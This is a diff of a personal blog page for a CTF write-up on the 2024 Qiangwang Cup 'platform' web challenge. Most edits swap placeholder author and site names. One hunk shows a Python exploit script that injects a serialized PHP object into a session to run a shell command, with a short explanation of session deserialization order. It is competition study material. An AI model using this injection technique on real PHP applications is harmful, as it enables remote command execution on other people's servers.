@@ -16,26 +16,26 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="John Doe">
+  <meta name="author" content="litt1e-ice">
   <meta name="keywords" content="">
   
     <meta name="description" content="platform打开只有登录框，扫描目录发现源码www.zip 1234567891011121314151617181920212223242526&#x2F;&#x2F;index.php&lt;?phpsession_start();require &#x27;user.php&#x27;;require &#x27;class.php&#x27;;$sessionManager &#x3D; new SessionMa">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2024强网杯复现wp">
-<meta property="og:url" content="http://example.com/2024/11/04/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0wp/index.html">
-<meta property="og:site_name" content="Hexo">
+<meta property="og:url" content="http://litt1e-ice.github.io/2024/11/04/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0wp/index.html">
+<meta property="og:site_name" content="litt1e-ice&#39;s blog">
 <meta property="og:description" content="platform打开只有登录框，扫描目录发现源码www.zip 1234567891011121314151617181920212223242526&#x2F;&#x2F;index.php&lt;?phpsession_start();require &#x27;user.php&#x27;;require &#x27;class.php&#x27;;$sessionManager &#x3D; new SessionMa">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-11-04T12:06:15.000Z">
-<meta property="article:modified_time" content="2024-11-04T13:56:07.509Z">
-<meta property="article:author" content="John Doe">
+<meta property="article:modified_time" content="2024-11-04T14:01:12.674Z">
+<meta property="article:author" content="litt1e-ice">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>2024强网杯复现wp - Hexo</title>
+  <title>2024强网杯复现wp - litt1e-ice&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -73,7 +73,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"litt1e-ice.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -296,9 +296,7 @@
 <p>脚步如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> os<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1&quot;</span><br><span class="hljs-comment">#url = &quot;http://eci-2zeg97hlr4shg75wqoyp.cloudeci1.ichunqiu.com:80&quot;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    data = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;exec&quot;</span>*<span class="hljs-number">9</span>+<span class="hljs-string">&quot;popen&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&#x27;;session_key|O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:28:&quot;syssystemtem(&quot;/readflag;ls -alh&quot;);&quot;;&#125;user|s:1:&quot;1aaaa&#x27;</span><br>    &#125;<br>    sess = os.urandom(<span class="hljs-number">8</span>).<span class="hljs-built_in">hex</span>()<br>    r = requests.post(url + <span class="hljs-string">&quot;/index.php&quot;</span>, data=data, headers=&#123;   <span class="hljs-comment">#本地测试后发现第一次请求index.php会生成session文件</span><br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">f&quot;PHPSESSID=<span class="hljs-subst">&#123;sess&#125;</span>&quot;</span>&#125;, allow_redirects=<span class="hljs-literal">False</span>)   <span class="hljs-comment">#第二次请求index.php才会过滤，但我本地测试的时候直接变成空的了，不知道怎么回事</span><br>    r = requests.post(url + <span class="hljs-string">&quot;/index.php&quot;</span>, data=data, headers=&#123;	 <span class="hljs-comment">#第三次请求dashboard.php才会有反序列化的回显</span><br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">f&quot;PHPSESSID=<span class="hljs-subst">&#123;sess&#125;</span>&quot;</span>&#125;, allow_redirects=<span class="hljs-literal">False</span>)<br><br>    r = requests.post(url + <span class="hljs-string">&quot;/dashboard.php&quot;</span>, data=data, headers=&#123;<br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">f&quot;PHPSESSID=<span class="hljs-subst">&#123;sess&#125;</span>&quot;</span>&#125;, allow_redirects=<span class="hljs-literal">False</span>)<br><br>    text = r.text<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;total &#x27;</span> <span class="hljs-keyword">in</span> text:<br>        <span class="hljs-built_in">print</span>(text)<br>        <span class="hljs-built_in">print</span>(sess)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
 
-<p>本地测试后发现第一次请求index.php会生成session文件，第二次请求index.php才会过滤，但我本地测试的时候直接变成空的了，不知道怎么回事，</p>
-<p>第三次请求dashboard.php才会有反序列化的回显，因为session反序列化是在session_start()的时候进行的;include(“class.php”);得放在</p>
-<p>session_start()的前面才行，不然他都不知道这个定义类是什么样。</p>
+<p>本地测试后发现第一次请求index.php会生成session文件，第二次请求index.php才会过滤，但我本地测试的时候直接变成空的了，不知道怎么回事，第三次请求dashboard.php才会有反序列化的回显，因为session反序列化是在session_start()的时候进行的;include(“class.php”);得放在session_start()的前面才行，不然反序列化的时候都不知道这个定义的类是什么样的。</p>
 
                 
               </div>
@@ -347,13 +345,13 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>2024强网杯复现wp</div>
-      <div>http://example.com/2024/11/04/2024强网杯复现wp/</div>
+      <div>http://litt1e-ice.github.io/2024/11/04/2024强网杯复现wp/</div>
     </div>
     <div class="license-meta">
       
         <div class="license-meta-item">
           <div>作者</div>
-          <div>John Doe</div>
+          <div>litt1e-ice</div>
         </div>
       
       
